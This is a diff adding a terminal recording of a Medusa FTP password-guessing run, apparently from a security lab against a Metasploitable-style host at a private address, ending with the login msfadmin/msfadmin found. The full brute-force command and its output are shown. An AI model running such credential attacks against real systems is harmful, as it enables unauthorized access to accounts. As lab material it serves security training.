@@ -1,0 +1,16 @@
+Script started on 2026-10-21 15:55:34-04:00 [COMMAND="medusa -h 192.168.56.101 -u msfadmin -P wordlists/ftp-senhas.txt -M ftp -t 1 -f -v 6" TERM="xterm-256color" TTY="/dev/pts/0" COLUMNS="140" LINES="50"]
+Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
+
+GENERAL: Parallel Hosts: 1 Parallel Logins: 1
+GENERAL: Total Hosts: 1 
+GENERAL: Total Users: 1
+GENERAL: Total Passwords: 5
+2026-10-21 15:55:38 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (1 of 1, 0 complete) Password: 123456 (1 of 5 complete)
+2026-10-21 15:55:40 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (1 of 1, 0 complete) Password: password (2 of 5 complete)
+2026-10-21 15:55:43 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (1 of 1, 0 complete) Password: admin123 (3 of 5 complete)
+2026-10-21 15:55:46 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (1 of 1, 0 complete) Password: kali (4 of 5 complete)
+2026-10-21 15:55:46 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (1 of 1, 0 complete) Password: msfadmin (5 of 5 complete)
+2026-10-21 15:55:46 ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS]
+GENERAL: Medusa has finished.
+
+Script done on 2026-10-21 15:55:46-04:00 [COMMAND_EXIT_CODE="0"]
